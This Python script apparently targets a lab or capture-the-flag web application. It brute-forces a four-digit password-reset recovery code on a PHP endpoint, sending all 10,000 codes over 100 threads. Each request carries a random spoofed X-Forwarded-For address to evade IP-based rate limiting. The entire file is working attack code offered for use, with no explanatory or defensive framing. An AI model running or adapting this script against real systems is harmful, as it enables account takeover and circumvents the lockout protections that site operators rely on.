import requests
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich.console import Console
from rich.prompt import Prompt
from rich.progress import Progress

# Initialize the Rich console for fancy output
console = Console()

# Ask user for the target IP and PHPSESSID cookie
TARGET_IP = Prompt.ask("[bold green]Enter the target IP address[/]")
TARGET_PORT = Prompt.ask("[bold green]Enter the target port[/]", default="1337")
SESSION_COOKIE = Prompt.ask("[bold green]Enter your PHPSESSID cookie[/]")

# URL for password reset form
RESET_PASSWORD_URL = f"http://{TARGET_IP}:{TARGET_PORT}/reset_password.php"

# HTTP request headers (without X-Forwarded-For)
REQUEST_HEADERS = {
    "Host": f"{TARGET_IP}:{TARGET_PORT}",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"http://{TARGET_IP}:{TARGET_PORT}",
    "DNT": "1",
    "Connection": "keep-alive",
    "Referer": f"http://{TARGET_IP}:{TARGET_PORT}/reset_password.php",
    "Upgrade-Insecure-Requests": "1",
    "Priority": "u=0, i",
    "Cookie": f"PHPSESSID={SESSION_COOKIE}"
}

# Custom exception to signal when the correct recovery code is found
class CorrectCodeFoundException(Exception):
    pass

def generate_recovery_codes():
    """Generator to yield all possible 4-digit recovery codes."""
    for code in range(10000):
        yield f"{code:04d}"  # Zero-padded 4-digit code, e.g., "0001"

def send_recovery_request(recovery_code):
    """
    Sends a POST request to the reset password endpoint with a given recovery code.
    
    Args:
        recovery_code (str): The recovery code to try.
    
    Raises:
        CorrectCodeFoundException: If the correct recovery code is found.
    """
    # Randomly generate an X-Forwarded-For IP address
    random_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    
    # Update request headers with the random IP
    headers_with_random_ip = REQUEST_HEADERS.copy()
    headers_with_random_ip["X-Forwarded-For"] = random_ip
    
    # Data payload for the POST request
    data_payload = {
        "recovery_code": recovery_code,
        "s": "179"  # Replace with the correct hidden field value if necessary
    }

    try:
        # Send the POST request
        response = requests.post(RESET_PASSWORD_URL, headers=headers_with_random_ip, data=data_payload, timeout=3)
        
        # Check if the response indicates a successful recovery code
        if "Invalid or expired recovery code!" not in response.text:
            console.print(f"[bold green]Success! The correct recovery code is: {recovery_code}[/]")
            raise CorrectCodeFoundException  # Signal to stop further processing
            quit()
    except requests.RequestException as e:
        # Handle request exceptions
        console.print(f"[bold red]Request failed for code {recovery_code}: {e}[/]", style="bold red")

def brute_force_recovery_code():
    """Attempts to brute-force the recovery code using multiple threads."""
    try:
        # ThreadPoolExecutor to handle multiple threads for concurrent requests
        with ThreadPoolExecutor(max_workers=100) as executor:
            # Progress bar for better visualization of brute force attempts
            with Progress(console=console) as progress:
                task = progress.add_task("[cyan]Brute-forcing recovery codes...", total=10000)
                
                # Submit tasks for each generated recovery code
                future_to_code_mapping = {executor.submit(send_recovery_request, code): code for code in generate_recovery_codes()}
                
                for future in as_completed(future_to_code_mapping):
                    progress.update(task, advance=1)  # Update the progress bar
                    future.result()  # Will raise CorrectCodeFoundException if the correct code is found
    except CorrectCodeFoundException:
        console.print("[bold yellow]Correct recovery code found, terminating brute-force process.[/]")
        executor.shutdown(wait=False)  # Immediately stop any remaining threads

if __name__ == "__main__":
    console.print("[bold blue]Starting the brute-force attack...[/]")
    brute_force_recovery_code()
